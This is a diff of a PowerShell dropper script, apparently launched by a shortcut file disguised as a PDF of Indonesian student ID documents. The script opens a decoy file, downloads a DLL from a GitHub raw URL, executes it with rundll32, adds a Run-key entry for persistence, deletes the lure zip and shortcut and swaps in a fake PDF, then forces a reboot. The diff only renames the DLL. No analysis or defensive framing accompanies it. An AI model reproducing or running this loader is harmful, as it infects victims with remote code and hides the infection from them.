@@ -1,11 +1,11 @@
 echo 1 > file.pdf ;
 .\file.pdf ;
-if (Test-Path C:\helper\log.dll) { exit } 
+if (Test-Path C:\helper\log2.dll) { exit } 
 else { 
-New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'rundll32 C:\helper\log.dll,DllRegisterServer' -Force ;
+New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "helper SystemLog" -Value 'rundll32 C:\helper\log2.dll,DllRegisterServer' -Force ;
 
 powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\helper' | Out-Null ;
-wget "https://github.com/RQ3Xd/1/raw/refs/heads/main/log.dll" -o C:\helper\log.dll; start-sleep 3 ;
-start-process rundll32 -Argument C:\helper\log.dll,DllRegisterServer ;
+wget "https://github.com/RQ3Xd/1/raw/refs/heads/main/log.dll" -o C:\helper\log2.dll; start-sleep 3 ;
+start-process rundll32 -Argument C:\helper\log2.dll,DllRegisterServer ;
 "kelengkapan_data_diri_KTM_KTP_Mahasiswa.zip","kelengkapan_data_diri_KTM_KTP_Mahasiswa.pdf.lnk" | % { Get-ChildItem $ENV:USERPROFILE -Recurse -Filter $_ | % { Remove-Item $_.FullName -Force; "1" | Out-File (Join-Path $_.DirectoryName "kelengkapan_data_diri_KTM_KTP_Mahasiswa.pdf") -Encoding UTF8 } } ; start-sleep 3600 ; shutdown /r /t 300;
 }
